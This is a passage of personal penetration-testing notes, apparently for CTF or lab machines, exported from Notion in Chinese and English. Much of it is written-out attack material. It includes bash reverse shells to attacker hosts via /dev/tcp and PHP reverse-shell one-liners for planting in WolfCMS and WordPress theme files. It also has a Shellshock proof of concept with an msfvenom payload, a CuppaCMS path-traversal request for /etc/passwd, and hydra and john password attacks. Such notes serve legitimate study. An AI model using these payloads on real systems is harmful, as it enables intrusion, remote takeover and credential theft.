—<mark class="highlight-yellow">hc</mark>(<strong>hide</strong> code) 404 &lt;http://example.com/<mark class="highlight-red">FUZZ</mark>&gt;</li></ul><ul id="1817b78e-c573-4ff7-9327-60b7e2f7944f" class="bulleted-list"><li style="list-style-type:disc">wfuzz -c -z <mark class="highlight-red">file,users.txt</mark> -z <mark class="highlight-teal">file,pass.txt</mark> —<mark class="highlight-yellow">sc</mark>(<strong>specified</strong> code) 200 http://www.site.com/log.asp?user=<mark class="highlight-red">FUZZ</mark>&amp;pass=<mark class="highlight-teal">FUZ2Z</mark></li></ul><ul id="0ae37c48-5d60-41a4-b530-938f4c1624d2" class="bulleted-list"><li style="list-style-type:disc">wfuzz -c -z range,1-10 —<mark class="highlight-yellow">hc=</mark><mark class="highlight-red">BBB</mark>(any status code) &lt;http://www.site.com/FUZZ&gt;{<mark class="highlight-red">something not there</mark>}</li></ul><ul id="4f7d797f-5d05-46f6-aec8-811c5e6dafce" class="bulleted-list"><li style="list-style-type:disc">wfuzz —<mark class="highlight-yellow">script</mark>=robots -z <mark class="highlight-red">list,robots.txt </mark>&lt;http://www.webscantest.com/<mark class="highlight-red">FUZZ</mark>&gt;
+</li></ul><h1 id="1f8f0f48-eb0d-4512-90b5-b4209ddc63a0" class="">exploit搜索</h1><h2 id="fd4bf802-87a3-4c90-b870-89ccb4a00145" class="">searchsploit</h2><p id="61a7ecd2-4fa3-44a2-8b2e-f64e2ecc9351" class="">-m(irror, for displaying details)</p><figure id="e204f385-cce7-499d-8122-31776bd83cda" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%208.png"><img style="width:1268px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%208.png"/></a></figure><h1 id="5d1f5c88-5668-4a06-8199-5d9fa55b384e" class="">密码破解</h1><h2 id="2b002f5c-6dc1-4d57-9765-025a74f4e531" class="">john</h2><ul id="a34d0db3-b54d-4931-afca-71c78dd5bf86" class="bulleted-list"><li style="list-style-type:disc">john shadow.hash</li></ul><h2 id="0876deaa-ef4a-4e2c-abb1-be7212174d4a" class="">hydra</h2><ul id="23ce1ed2-b461-4e73-92dc-c51abf242dac" class="bulleted-list"><li style="list-style-type:disc">hydra -<mark class="highlight-yellow">L</mark> user.list(自己构建的user名单) -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.21 -t 4</li></ul><h1 id="cf008219-adee-4197-965f-144b1d29e108" class="">其他工具</h1><h2 id="50470f28-eb35-4f96-974d-e52c2e46951e" class="">scrot</h2><p id="bd298b3c-65c4-4584-87fb-4bbc25f8eb0d" class="">截图工具</p><ul id="491399e3-714e-4b38-be3e-3f5c06dfb198" class="bulleted-list"><li style="list-style-type:disc">scrot -s &lt;保存路径&gt;</li></ul><h2 id="3572947f-70f6-40ad-abbb-2f7b9b853268" class="">xdg-open</h2><p id="31b0625c-2e4b-4f30-8e5a-70c6d80ca199" class="">文件查看 </p><ul id="4b030213-bf2f-4612-8f35-f8a3ce00a3f5" class="bulleted-list"><li style="list-style-type:disc">xdg-open &lt;file&gt;</li></ul><h2 id="64bd3013-3491-4e30-ab0a-e9c3edf0047a" class="">php</h2><ul id="dad44f6b-90ae-4720-ba94-0c5dae473bc7" class="bulleted-list"><li style="list-style-type:disc">php -S 0:80（在80端口运行服务器）</li></ul><h1 id="1a306a87-f87a-4e86-8626-dc733f53552f" class="">Payload生成</h1><h2 id="ddadd1e2-ba87-41e1-80db-2696e8a7a1e4" class="">msfvenom</h2><p id="a1aa034d-0a10-4084-8e00-e546be4284ae" class="">sudo msfvenom -<mark class="highlight-yellow">p</mark>(ayload) cmd/unix/reverse_bash [lhost(攻击者主机)=10.10.10.3 lport=443](脚本参数) -<mark class="highlight-yellow">f</mark>(ormat) raw</p><figure id="cf10ff4a-c796-4d55-aa17-3f1adb647f80" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%209.png"><img style="width:962px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%209.png"/></a></figure><p id="1e12a7bb-26ba-4671-aa28-c2a831484210" class="">sudo msfvenom -<mark class="highlight-yellow">p</mark>(ayload) cmd/unix/reverse_python [lhost(攻击者主机)=10.10.10.3 lport=443](脚本参数) -<mark class="highlight-yellow">f</mark>(ormat) raw</p><h1 id="ffeff7fd-67ea-43d9-a943-140a650b1907" class="">后渗透（post-exploitation）</h1><h2 id="b7652c46-8233-4229-9545-6459feaeea58" class="">Python获得交互性更好的shell</h2><ul id="dd43bfff-cf20-48bf-b82c-7cf19065ae67" class="bulleted-list"><li style="list-style-type:disc">python -c “import pty;pty.spawn(’/bin/bash’)” </li></ul><h2 id="25a6c1e5-ad98-42cc-a1a2-f27243597cb8" class="">提权</h2><ul id="6e8034a6-90f9-437c-9a68-0b013ef86078" class="bulleted-list"><li style="list-style-type:disc">whoai</li></ul><ul id="2c48c15b-cdc5-40b2-8427-9d48033d3c6c" class="bulleted-list"><li style="list-style-type:disc">id</li></ul><ul id="e8f1c58b-e0c1-413f-b4b9-b8fb8e1f88c0" class="bulleted-list"><li style="list-style-type:disc">dpkg(package manager for Debian) -l</li></ul><ul id="90cbd9d5-8168-461f-9999-eb15e84a6c94" class="bulleted-list"><li style="list-style-type:disc">uname -a</li></ul><ul id="c30746aa-384b-41df-bc10-16d498e4eab8" class="bulleted-list"><li style="list-style-type:disc">sudo -l(系统级权限)</li></ul><figure id="43bef82c-35c7-4cd3-b64c-838f12efe80f" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%2010.png"><img style="width:1032px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%2010.png"/></a></figure><p id="b385d5f4-486c-4f19-bcce-cde0ffcbb8cb" class="">sudo /bin/bash</p><p id="7494d76c-c1ca-411f-9235-aabbc85d1b4e" class="">flag应该在<mark class="highlight-yellow">/root</mark>目录下</p><p id="da3c18d8-07f1-48ad-b89b-e01d5b64abf8" class="">
+</p><h1 id="b093cd27-c5ba-43ee-9b62-5e7420e2b60f" class="">Software</h1><h2 id="b67d6274-a22e-4f68-8eed-433612670678" class="">FTP(port:21)</h2><p id="12adb971-71cb-4b18-88cb-bc008a08ed84" class="">Name: anonymous</p><p id="4e6e1303-6fef-4dae-b63e-f31208ed5c9d" class="">password 直接回车</p><p id="668057c0-89f7-445a-881d-5193b5d2fc0c" class="">binary ⇒ 切换到<mark class="highlight-red">二进制模式</mark>，不然下载下来会有乱码</p><h2 id="3295cafc-21e8-4b87-8202-51577dc03857" class="">数据库</h2><h3 id="db3c27c4-2381-4a96-bf3d-3267a0ea56e2" class="">SQLMap</h3><ul id="e20fe6d4-81db-4d32-9df2-cd6efa662a8c" class="bulleted-list"><li style="list-style-type:disc">-<mark class="highlight-yellow">u</mark>(rl) &quot;http://192.168.1.3/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</li></ul><ul id="8b85713d-9f3e-48f3-b39f-3a6ddbae9f3e" class="bulleted-list"><li style="list-style-type:disc">—<mark class="highlight-yellow">cookie</mark>=&quot;PHPSESSID=3bvm0ubljef9kbqeta1d5341r2; security=low&quot;</li></ul><ul id="5f78dbb0-533a-4f86-adc8-fbadae9de41a" class="bulleted-list"><li style="list-style-type:disc">—<mark class="highlight-yellow">tables</mark>(database tables) — <mark class="highlight-yellow">schema</mark>(database schema) —<mark class="highlight-yellow">batch</mark>(automate default process)</li></ul><ul id="9594423d-7575-4158-9bd9-0f69537d8dac" class="bulleted-list"><li style="list-style-type:disc">—<mark class="highlight-yellow">columns</mark> -<mark class="highlight-yellow">T</mark>(able) users -<mark class="highlight-yellow">D</mark>(database) —<mark class="highlight-yellow">batch</mark></li></ul><ul id="088bda1a-9249-42d6-9a2e-753f3d65e0ba" class="bulleted-list"><li style="list-style-type:disc">—<mark class="highlight-yellow">dump</mark><mark class="highlight-default">(store </mark>the result, it can also crack the password hashes)</li></ul><ul id="d9f57d15-8de7-4dfa-bd38-fb4086461e57" class="bulleted-list"><li style="list-style-type:disc">—<mark class="highlight-yellow">dbs</mark><mark class="highlight-default">(database enumeration)</mark></li></ul><ul id="4617abce-4c13-44ae-a029-d0175abd1c6f" class="bulleted-list"><li style="list-style-type:disc">—<mark class="highlight-yellow">password</mark>(Get user that manage this db)</li></ul><p id="cdac9154-aed4-444d-bc15-377e7e466e9e" class="">mysql(port:3306)</p><h2 id="66b629f0-0907-4ffe-8ea7-e65d6f12c328" class="">Jenkins漏洞</h2><h3 id="5dfa8eb9-d44d-4422-afb4-c1177b9178fc" class="">reverse shell</h3><p id="4d532eb0-3943-44aa-a358-4df64610c8a1" class=""><a href="https://www.bilibili.com/video/BV1jm4y1A7Tm/?spm_id_from=333.788">https://www.bilibili.com/video/BV1jm4y1A7Tm/?spm_id_from=333.788</a></p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="b0f78650-0e47-4428-8bd8-7d78a2f151c1"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.3/4444 0&gt;&amp;1</div></figure><h2 id="53242911-e1b7-4b66-a28a-23011901a5b7" class="">缓存代理服务器(cache web proxy server)</h2><p id="478aa30f-3d3f-45d5-9a31-795cf36dfb5d" class="">出现此类服务器，记得在使用工具（浏览器）时加上代理</p><h3 id="8a4a600a-af9a-4af4-8e4d-875b6b9e0a60" class="">Squid</h3><ul id="6f02c844-e975-4971-9a20-e04c82d37595" class="bulleted-list"><li style="list-style-type:disc"><a href="https://en.wikipedia.org/wiki/Squid_(software)">https://en.wikipedia.org/wiki/Squid_(software)</a></li></ul><ul id="e0096f79-401d-4682-b261-ae50e373d174" class="bulleted-list"><li style="list-style-type:disc">如果存在这种代理服务器，在目录爆破的时候要对指令加入代理地址</li></ul><p id="d257ea64-acde-43e4-8a7e-6530a8c2794d" class="">gubuster直接在-u后改地址。 dirb需要额外-p(ort) flag</p><p id="fe63cea0-93db-4311-ba4c-8e340baaddb3" class=""><mark class="highlight-yellow">浏览器也要设置代理，这样才可以访问目录爆破出来的路由</mark></p><p id="ea287231-7f4e-4a18-b8dd-56c672b03507" class="">🌰：</p><p id="1c8f9fa8-8a6a-4621-af2d-7b6a097fbbf7" class="">1. squid代理后的wolfcms，需设置浏览器代理才可以访问<a href="https://www.bilibili.com/video/BV1Em4y1A7XX/?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1Em4y1A7XX/?spm_id_from=333.999.0.0</a></p><figure id="32a07392-c46c-4967-ad00-b2185a3d6c59" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%2011.png"><img style="width:1006px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%2011.png"/></a></figure><h2 id="e6cf035a-b986-4b25-aeb9-17007f0e7df8" class="">CMS</h2><h3 id="57d1c77c-dae5-425f-a3e2-bf6b061ebd3e" class="">WolfCMS</h3><p id="72d4290f-edf4-4525-9ec3-cabe748cdaa1" class="">PHP一句话木马(PHP reverse shell one-liner)</p><pre id="f93e5cc2-8c47-4f79-be1d-5975be9434f7" class="code"><code>&lt;?php
+exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;&amp;1&#x27;&quot;);</code></pre><h3 id="a279fb95-a3b7-442e-9e80-f673ceb9caaf" class="">CuppaCMS</h3><ol type="1" id="a4960bab-154f-47f5-9832-45e3f9c3bf94" class="numbered-list" start="1"><li>文件包含漏洞<a href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a></li></ol><p id="7225f4cb-161a-41a9-b47f-c93ad4d38870" class="">curl —data-encode ‘urlconfig=../../../../../../../../../etc/passwd’ http://10.10.10.21/administrator/alerts/alertConfigField.php</p><h2 id="eb84077e-84a1-45de-a48d-ec9aa532084c" class="">WordPress</h2><h2 id="78d76cc8-9c6f-430b-839e-a4a7b45d8998" class="">Routes</h2><h3 id="95ca33bf-4748-48f1-abab-5bfc4a4e4abf" class="">wp-admin ⇒ Appearance ⇒ Theme Files</h3><pre id="552be3fa-3399-40e8-8801-80d04ea8e42d" class="code"><code>&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.3/443 0&gt;&amp;1&#x27;&quot;)&gt;</code></pre><figure id="1d2723a8-3a2b-4b28-9106-308cd2905e9e" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%2012.png"><img style="width:432px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%2012.png"/></a></figure><p id="0b371ad2-4ecd-434e-8818-7d6990e700f2" class="">
+</p><h2 id="00be72b4-0fbb-47b8-8219-0a7514ac0f2b" class="">Shell</h2><h3 id="dc2d32a2-68b9-40d8-96fb-b90342c3937e" class="">Shellshock</h3><p id="3f021671-2dd4-4abc-8f3f-5bdb600f96ef" class=""><a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">https://en.wikipedia.org/wiki/Shellshock_(software_bug)</a></p><ol type="1" id="5fa2db62-7f9f-4771-9f6b-f700a71b10d4" class="numbered-list" start="1"><li><span style="border-bottom:0.05em solid"><strong>POC</strong></span>:<p id="a389a83f-930f-4fa2-8200-9e01c9f4d562" class="">curl -<mark class="highlight-yellow">v</mark> —<mark class="highlight-yellow">proxy</mark> http://10.10.10.19:3128 http://10.10.10.19cgi-bin/status -<mark class="highlight-yellow">H</mark> “Referer:() {  test;}; echo ‘Content-Type: text/plain’; echo; echo; echo; /usr/bin/id;exit”</p></li></ol><ol type="1" id="12b81bd4-16e2-4ef3-952b-84436868c42d" class="numbered-list" start="2"><li><span style="border-bottom:0.05em solid"><strong>Payload(generated by msfvenom)</strong></span><p id="2bc42d14-43fd-4e89-b3b5-2068206beed0" class="">msfvenom生成的反弹shell Payload: </p><ol type="1" id="b2327fdc-d226-4bde-a7d4-60dc924428fb" class="numbered-list" start="1"><li>sudo msfvenom -<mark class="highlight-yellow">p</mark> cmd/unix/reverse_bash lhost=10.10.10.3 lport=443 -<mark class="highlight-yellow">f</mark> raw</li></ol><ol type="1" id="e335f9dd-b89d-4326-b1d6-551af2b71ffc" class="numbered-list" start="2"><li>bash -c ‘<mark class="highlight-teal">0&lt;&amp;144-;exec 144&lt;&gt;/dev/tcp/10.10.10.3/443;sh &lt;&amp;144 &gt;&amp;144 2&gt;&amp;144</mark>’</li></ol><p id="3ac646f0-ceae-46a3-82c2-6158af2d8d05" class="">与curl命令连接，<mark class="highlight-red">注意要把sh修改为完整路径，否则会报错找不到sh</mark></p><ul id="a6a64716-00cd-42b4-9be4-cec57c5dba96" class="bulleted-list"><li style="list-style-type:disc">curl -<mark class="highlight-yellow">v</mark> —<mark class="highlight-yellow">proxy</mark> http://10.10.10.19:3128 http://10.10.10.19cgi-bin/status -<mark class="highlight-yellow">H</mark> “Referer:() {  test;}; Payload的<mark class="highlight-teal">绿色部分</mark>”</li></ul><h2 id="0e6910de-8778-42e6-8ad2-fb3ae622d405" class="">Linux kernel</h2><ul id="837ea99f-a6bf-4d96-abd8-bb7c95956db3" class="bulleted-list"><li style="list-style-type:disc">uname -a</li></ul><ul id="cc646cc2-0c4c-4dc5-8f28-71e98a0b5982" class="bulleted-list"><li style="list-style-type:disc">search &lt;uname -a&gt;</li></ul><ul id="dd745291-6a8a-4062-ab42-7ed538425e9e" class="bulleted-list"><li style="list-style-type:disc">gcc 编译</li></ul><ul id="713ffe64-fb22-46a5-8a53-189b4eb291d2" class="bulleted-list"><li style="list-style-type:disc">运行</li></ul></li></ol><h1 id="98b79820-f1e6-416d-88b3-58658ddb1a1d" class="">Linux敏感文件</h1><h2 id="883386bf-3a70-4f90-9e36-e44d4a1e71f5" class="">etc/passwd</h2><p id="c31204a2-593b-4a00-bbe3-deb24aac4c06" class="">文件内存储系统用户与密码</p><ul id="ccf7dbf3-a3be-4a03-9669-c050101c7b43" class="bulleted-list"><li style="list-style-type:disc">用户名:shadow密码:用户ID:组ID:简单描述:home目录:shell环境</li></ul><ul id="18886530-8d0f-41db-ac23-5d0cd0ccdc83" class="bulleted-list"><li style="list-style-type:disc">小于1000的账号除root外意义不大</li></ul><ul id="c7e20951-9ea2-42ef-bc5b-c35132fcd6a4" class="bulleted-list"><li style="list-style-type:disc">没有shell环境意义也不大 </li></ul><p id="9622d186-dcd9-4d8f-a2c6-87295b23e025" class="">可以用crackmap来自动化试密码</p><figure id="c28e4ce9-870d-47f9-858b-45f382a646b6" class="image"><a href="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%2013.png"><img style="width:856px" src="Sec%20Tools%20d59e1327017b4fa1a055da9bb778b0b4/Untitled%2013.png"/></a></figure><h2 id="99586a5e-bf41-4154-abb2-ee71367c7fe6" class="">shadow</h2><p id="f21feef0-c824-49ce-81c3-ca6d95f890b8" class=""><mark class="highlight-red">使用john破解哈希</mark></p><p id="6cacb40d-203d-4e0f-8e39-14ab9244b1e7" class="">通常位于 Unix-like 操作系统中的 <code><strong>/etc/shadow</strong></code> 路径下。它用于存储用户账户的加密密码以及与账户相关的密码策略信息。</p><p id="54f8a726-df56-4511-8ca5-51e3b0c51d13" class=""><code><strong>/etc/shadow</strong></code> 文件的格式通常由多个字段组成，以冒号（:）分隔。每个字段包含不同的用户账户信息，例如用户名、加密的密码、密码过期日期、账户是否被锁定等。具体字段的含义和顺序可能会根据不同的操作系统和配置而有所变化。</p><h2 id="d5bc21e2-3213-4331-b2b2-24d360bc868a" class="">etc/crontab &amp; cron.d</h2><p id="9066c7ba-7103-4dc2-a12e-c3a533ad6151" class=""><strong>crontab</strong>:
+<code><strong>crontab</strong></code> 是一个命令行工具，用于管理个人用户的周期性任务。每个用户可以使用 <code><strong>crontab</strong></code> 命令创建和管理自己的任务列表。用户的任务列表被存储在 <code><strong>/var/spool/cron</strong></code> 目录中，每个用户有一个与其关联的 crontab 文件。用户可以使用 <code><strong>crontab -e</strong></code> 命令编辑自己的 crontab 文件，并使用 <code><strong>crontab -l</strong></code> 列出当前用户的任务列表，<code><strong>crontab -r</strong></code> 删除用户的任务列表。</p><p id="95069c48-8543-45f9-a9c5-a41c6f48b552" class=""><strong>cron.d</strong>:
+<code><strong>cron.d</strong></code> 是一个目录，用于存储系统范围的周期性任务配置文件。与个人用户的 crontab 文件不同，cron.d 目录中的文件是由系统管理员创建和管理的。每个文件代表一个独立的任务，并且可以使用文件名指定任务的执行时间和频率。这些文件可以包含更复杂的任务定义，允许在系统范围内执行任务，而不仅限于个人用户。</p><p id="d9d6a868-63d2-467b-821f-5ffca872f302" class="">通常，cron.d 目录中的文件遵循特定的命名约定，例如在文件名中包含任务的描述和时间信息，以便清晰地识别和管理任务。</p><p id="9467d687-fd3a-428f-b4db-d553a9eebc12" class="">在大多数 Unix-like 系统中，cron 调度器会定期扫描个人用户的 crontab 文件和 cron.d 目录中的任务配置文件，并在指定的时间和频率下执行这些任务。</p><p id="9c18fce3-3577-48b6-94a0-5f58fb7ea0c0" class="">总结来说，<code><strong>crontab</strong></code> 用于个人用户的任务管理，而 <code><strong>cron.d</strong></code> 是一个目录，用于存储系统范围的任务配置文件。</p><h3 id="a2ab0ae3-7224-4f0b-a988-14b74380e88c" class="">🌰：</h3><p id="cd5f459e-3830-4c58-b75b-f7ee674bf67e" class="">cron.d下的automate每一分钟执行/var/www下的connect.py文件一次</p><p id="e9cf41f0-5d7c-4308-aeaa-2ab361813530" class="">用msfvenom生成payload，🉑️反弹shel</p><h1 id="41955929-8463-420c-8427-78fcb1ab693c" class="">虚拟机网络设置</h1><ol type="1" id="4d18f476-a9c1-4cf2-892e-7c55a4b23d70" class="numbered-list" start="1"><li>共享模式（NAT）：
+在共享模式下，虚拟机被分配一个私有IP地址，通常是在一个虚拟网络中，由虚拟化软件（如VMware、VirtualBox等）管理。虚拟机可以通过主机的网络连接来访问外部网络，但外部网络无法直接访问虚拟机，因为虚拟机的网络流量被NAT（Network Address Translation，网络地址转换）机制转发。这种模式适合需要虚拟机与外部网络通信，但不需要外部网络直接访问虚拟机的情况。</li></ol><ol type="1" id="9f259de7-bb09-4d55-8f93-af4064d7874f" class="numbered-list" start="2"><li>Host-Only模式（主机模式）：
+在Host-Only模式下，虚拟机和主机之间建立了一个私有网络，虚拟机可以相互通信，但无法访问主机所在网络或外部网络。这种模式适合需要在虚拟机之间进行通信，但不需要与外部网络通信的场景，例如测试网络环境。</li></ol><ol type="1" id="02ebd263-2bc1-4282-a8a8-c8ccf64bfc04" class="numbered-list" start="3"><li>桥接模式（Bridged）：
+在桥接模式下，虚拟机被连接到主机网络的物理接口上，就像主机上的另一个设备一样。虚拟机会被分配一个与主机网络相同子网的IP地址，使虚拟机能够直接与主机网络和外部网络通信。这使得虚拟机可以像主机一样在网络上可见，也能与其他设备进行通信。桥接模式适合需要虚拟机与外部网络紧密集成的情况，例如在虚拟机上运行服务器或进行网络测试。</li></ol></div></article></body></html>
